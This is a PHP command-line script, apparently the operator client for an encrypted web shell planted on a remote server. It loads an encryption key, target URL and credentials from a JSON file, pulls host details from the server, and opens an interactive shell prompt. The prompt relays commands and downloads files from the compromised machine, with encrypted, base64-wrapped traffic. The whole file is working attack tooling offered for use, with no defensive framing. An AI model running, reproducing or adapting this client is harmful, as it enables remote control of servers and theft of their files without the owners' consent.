#!/usr/bin/env php
<?php
include './functions.php';

$version = "2.0";

print_help($version);

$arguments_count = count($argv);

if ($arguments_count == 1) {
    echo "\n [-] I need a json file containing the settings. \n\n";
    exit(-1);
}

$file = $argv[1];

if (!is_readable($file)) {
    echo "\n [-] Hey! I can't read that file no_O\n\n";
    exit(-1);
}

// Read our config file

$config = json_decode(file_get_contents($file), true);

if (!is_json_valid($config)) {
    echo "\n [-] That config file is not valid! (╯°□°)╯︵ ┻━┻\n\n";
    exit(-1);
}

echo "\n [+] The json file is valid.\n";

$key      = trim($config['key']);
$iv       = trim($config['iv']);
$url      = trim($config['url']);
$login    = trim($config['login']['username']);
$password = trim($config['login']['password']);
$proxy    = array();

if (isset($config['proxy'])) {
    echo " [+] We're going to use a proxy.\n";
    $proxy = $config['proxy'];
}

$cookies = null;

if (isset($config['cookies'])) {
    $cookies = $config['cookies'];
}

$username    = '';
$path        = '';
$hostname    = '';
$php_version = '';
$os          = '';
$info        = '';
$time        = '';
$ip          = '';
$client_ip   = '';
$tools       = array();

$continue = false;

echo " [+] Trying to connect... ";

$result = send_request($url, array(
    'i' => base64_encode('ping')
), $login, $password, $proxy, $cookies);

if ($result['status'] == 200) {
    echo "Good.\n";
    echo " [+] Let's parse the host information... ";
    $response    = json_decode(encrypt_decrypt('decrypt', $result['content'], $key, $iv), true);
    $username    = base64_decode($response['user']);
    $path        = base64_decode($response['path']);
    $hostname    = base64_decode($response['hostname']);
    $php_version = base64_decode($response['php']);
    $os          = base64_decode($response['os']);
    $info        = base64_decode($response['server']);
    $time        = base64_decode($response['time']);
    $ip          = base64_decode($response['ip']);
    $client_ip   = base64_decode($response['client_ip']);
    $tools       = explode('|', base64_decode($response['tools']));
    unset($response);
    if (strlen($time) != 0) {
        $continue = true;
        echo "Done.\n";
    } else {
        echo "Failed.\n";
    }
}

if (!$continue) {
    exit(-1);
}
echo " [+] Opening the shell... \n";
sleep(1);
print_banner();
echo "\n";
echo "Server IP : \e[1m{$ip}\e[0m | Your IP : \e[1m{$client_ip}\e[0m\n";
echo "Time @ Server : \e[1m{$time}\e[0m\n";
echo "\e[1m{$os}\e[0m\n\e[1m{$info}\e[0m\n";
echo "\n";
do {
    $prefix = "\e[91m{$username}\e[0m@\e[33m{$hostname}\e[0m:\e[94m{$path}\e[0m$ ";
    $line   = readline($prefix);
    $cmd    = trim(str_replace(array(
        "\n",
        "\r"
    ), '', $line));
    if ($cmd != 'exit' && strlen($cmd) > 0) {
        $data = build_request($cmd, $path, $key, $iv);
        if (!isset($data['c']) && !isset($data['f'])) {
            continue;
        }
        $result = send_request($url, $data, $login, $password, $proxy, $cookies);
        if ($result['status'] == 200) {
            $decrypted_content = encrypt_decrypt('decrypt', $result['content'], $key, $iv);
            $response          = json_decode($decrypted_content, true);
            $path              = base64_decode($response['path']);
            $files             = $response['files'];
            if(!is_null($files)){
                foreach ($files as $file) {
                    $content  = $file['content'];
                    $download = base64_to_file($content, getcwd(), basename($file['name']));
                    echo " [+] File \e[94m{$download}\e[0m was downloaded successfully.\n";
                }
            }
            echo base64_decode($response['output']);
        } else {
            echo "\n\tWe received {$result['status']} instead of 200 ¯\_(ツ)_/¯\n\n";
        }
    }
} while (strtolower($cmd) != 'exit');